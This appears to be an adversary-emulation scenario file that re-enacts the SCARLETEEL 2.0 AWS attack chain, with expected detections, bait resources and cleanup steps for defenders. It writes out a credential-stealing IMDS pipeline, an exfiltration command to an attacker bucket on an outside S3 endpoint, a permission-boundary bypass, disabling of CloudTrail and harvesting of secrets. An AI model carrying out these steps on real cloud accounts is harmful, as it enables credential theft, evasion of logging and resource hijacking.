techniques.name: Exploit Public-Facing Application
techniques.description: Exploit command injection vulnerability in Flask web application running inside a Docker container on port 8080. HTTP POST to /cmd endpoint with arbitrary shell commands.
expected_alert_findings: WAF alert on command injection pattern

attack_surface: EC2 instance running vulnerable Flask app on port 8080 (0.0.0.0/0)

techniques.opsec_notes: Container exploitation generates ZERO CloudTrail events.

techniques.name: Cloud Instance Metadata API
techniques.description: Steal EC2 instance role temporary credentials from IMDSv1 endpoint from inside a Docker container. Follows the SCARLETEEL wget/sed/grep/configure pipeline pattern.
data_plane_actions: SCARLETEEL pipeline: curl | sed s/,/\n/g | grep AccessKeyId | sed -> configure_stolen.sh | sh

attack_surface: EC2 instance with IMDSv1 enabled (HttpTokens=optional, HopLimit=2)
target: IAM role with broad permissions attached to instance

techniques.opsec_notes: Invisible to CloudTrail. Real SCARLETEEL also exfiltrates via /dev/tcp built-in and Russian S3 endpoint to avoid CloudTrail in the victim account.

techniques.name: Exfiltration Over Alternative Protocol
techniques.description: SCARLETEEL 2.0 exfiltrates credentials via /dev/tcp shell built-in (bypasses firewall rules that block curl/wget) and via Russian S3-compatible endpoint (hb.bizmrg.com) which generates no CloudTrail events in the victim account.
data_plane_actions: aws s3 cp credentials s3://attacker-bucket/ --endpoint-url https://hb.bizmrg.com (simulated)
expected_alert_findings: VPC Flow Logs: outbound connection to 175.102.182.6:80
DNS query for hb.bizmrg.com (Russian S3 endpoint)
techniques.opsec_notes: SIMULATED ONLY — logged to /tmp/exfil_sim.log. Russian S3 endpoint technique generates ZERO CloudTrail events in the victim account — a key SCARLETEEL 2.0 innovation.

techniques.name: Resource Hijacking
techniques.description: Deploy XMRig cryptominer + Pandora (Mirai variant DDoS bot) on compromised container host. Real SCARLETEEL 2.0 installed XMRig masquerading as 'containered' service and Pandora DDoS bot.
data_plane_actions: HTTP POST /cmd to deploy miner simulation
host_commands: cat > /tmp/config_background.json (XMRig c3pool config with real wallet address)
techniques.opsec_notes: SIMULATED ONLY. Real SCARLETEEL 2.0 used Monero wallet 43Lfq18Tyc... and pool.c3pool.com:13333.

techniques.name: Cloud Service Discovery
techniques.description: Pacu-style IAM recon (ListUsers, ListRoles) followed by full S3 and Lambda enumeration using stolen instance role credentials. SCARLETEEL 2.0 used Pacu as its recon tool.
expected_alert_findings: SIEM: 5+ Lambda read APIs within 30 seconds
techniques.opsec_notes: ListUsers + ListRoles at the start distinguishes SCARLETEEL 2.0 (Pacu recon) from SCARLETEEL 1.0.

techniques.name: Valid Accounts: Cloud Accounts
techniques.description: Use stolen EC2 instance role temporary credentials from external IP. Also test AdminJoe naming-convention bypass: permission boundary denies iam:CreateAccessKey for 'admin*' (lowercase StringLike), but 'AdminJoe' (capital A) bypasses the condition.
expected_alert_findings: CloudTrail: CreateUser from EC2 instance role

attack_surface: Over-privileged EC2 role with iam:CreateUser permission
bait: AdminJoe IAM user (created by permission boundary bypass logic)

techniques.opsec_notes: The AdminJoe bypass is a real SCARLETEEL 2.0 technique. IAM StringLike 'admin*' is case-sensitive — capital A bypasses the deny.

techniques.name: Account Manipulation: Additional Cloud Credentials
techniques.description: Attempt to create additional access keys on AdminJoe IAM user as a persistence mechanism. The naming-convention bypass (capital A) tests whether the IAM permission boundary's admin* StringLike deny condition applies.
expected_alert_findings: CloudTrail: CreateAccessKey on existing user from EC2 instance role principal
cleanup_actions: Delete any created access keys via ListAccessKeys + DeleteAccessKey
techniques.opsec_notes: The bypass only works if AdminJoe user actually exists. If the user does not exist, CreateAccessKey returns NoSuchEntity (not AccessDenied), confirming the bypass logic works.

techniques.name: Disable or Modify Cloud Logs
techniques.description: Disable CloudTrail logging via cloudtrail:StopLogging after discovering the trail name via DescribeTrails. Executed within seconds of the previous phase — fully automated.
expected_alert_findings: CloudWatch alarm on StopLogging metric filter
cleanup_actions: SCP to prevent StopLogging from non-admin principals
techniques.opsec_notes: After StopLogging, subsequent API calls still appear in CloudTrail's 90-day internal event history (LookupEvents) but NOT in the S3 delivery bucket.

techniques.name: Credentials In Files
techniques.description: Extract IAM long-term access key credentials from terraform.tfstate file stored in S3 bucket. State file contains plaintext aws_iam_access_key resources for the bait IAM user.

expected_audit_events.note: Data event — invisible without S3 data event logging

expected_alert_findings: CRITICAL GAP: Data event only — invisible without explicit S3 data event logging

bait: terraform.tfstate containing IAM access key for bait user in tf-state S3 bucket

techniques.opsec_notes: This technique occurs AFTER CloudTrail StopLogging in Phase 4 — invisible both as a management event and because the trail is stopped.

techniques.name: Steal Application Access Token
techniques.description: Harvest AWS Secrets Manager secrets using stolen EC2 instance role credentials. The role has secretsmanager:ListSecrets and secretsmanager:GetSecretValue permissions.
expected_alert_findings: SIEM: GetSecretValue from EC2 instance role from external IP

bait: Secrets Manager secret: prod/database/master_credentials with fake DB credentials

techniques.opsec_notes: ListSecrets + GetSecretValue in the same second indicates automated tooling. SecretsManager harvest is a SCARLETEEL 2.0 addition not present in the original campaign.
